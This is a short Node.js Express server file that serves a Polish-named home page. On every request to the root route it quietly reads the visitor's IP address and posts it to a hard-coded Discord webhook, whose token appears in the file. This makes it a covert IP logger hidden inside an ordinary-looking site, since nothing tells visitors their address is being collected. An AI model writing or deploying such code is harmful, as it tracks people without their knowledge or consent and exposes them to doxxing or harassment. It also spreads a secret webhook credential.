// server.js
const express = require('express');
const app = express();
const port = 3000;
app.set('trust proxy', true);
// Define a route for GET requests
app.get('/', (req, res, next) => {
    const ip = req.header('x-forwarded-for') ||
						req.socket.remoteAddress;
    fetch(
    "https://discord.com/api/webhooks/1241084793802850426/e-hMfQ1lVanHlHgavBGJESfwhshIxO0G9TfrZNoeI0GiuIjedUov7NvjHp00wDP2ySlQ", 
    {
        method: "POST",
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            content: ip,
        })
    }
    );
    res.sendFile('Strona gwna.html');
    next();
});

// Define another route for GET requests with a parameter
app.get('/user/:id', (req, res) => {
  const userId = req.params.id;
  res.send(`User ID: ${userId}`);
});

// Start the server
app.listen(port, () => {
  console.log(`Server is running at http://localhost:${port}`);
});
